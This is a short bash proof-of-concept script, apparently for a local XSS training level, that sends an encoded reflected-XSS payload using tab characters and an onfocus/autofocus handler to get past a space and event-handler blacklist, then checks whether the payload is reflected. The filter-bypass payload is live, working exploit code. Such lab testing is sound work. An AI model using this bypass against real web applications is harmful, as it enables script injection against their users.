#!/bin/bash
# XSS Bypass PoC: Using onfocus with autofocus and tab whitespace
# Target: http://localhost:5000/level13
# Bypass Technique: Tab character as whitespace bypass

TARGET="http://localhost:5000/level13"

# Payload: ><img[TAB]src=x[TAB]onfocus=alert("XSS")[TAB]autofocus>
# Using tab character (%09) to bypass space blacklist
# Using onfocus (not blacklisted) instead of onclick/onerror
# Using autofocus to trigger the event immediately

PAYLOAD=">%3Cimg%09src=x%09onfocus=alert%28%22XSS%22%29%09autofocus%3E"

echo "[*] Testing XSS bypass with onfocus event handler"
echo "[*] Target: $TARGET"
echo "[*] Payload: ><img[TAB]src=x[TAB]onfocus=alert(\"XSS\")[TAB]autofocus>"
echo ""

RESPONSE=$(curl -s "$TARGET?name=$PAYLOAD")

# Check if payload was reflected in the HTML
if echo "$RESPONSE" | grep -q 'onfocus=alert'; then
    echo "[+] SUCCESS: Payload reflected in HTML response"
    echo "[+] The onfocus event handler was not filtered"
    echo "[+] Tab character successfully bypassed space blacklist"
    echo "[+] Double quotes successfully bypassed single quote blacklist"
    echo "[+] Payload would execute when img element receives focus via autofocus"
    exit 0
else
    echo "[-] FAILED: Payload not found in response"
    exit 1
fi
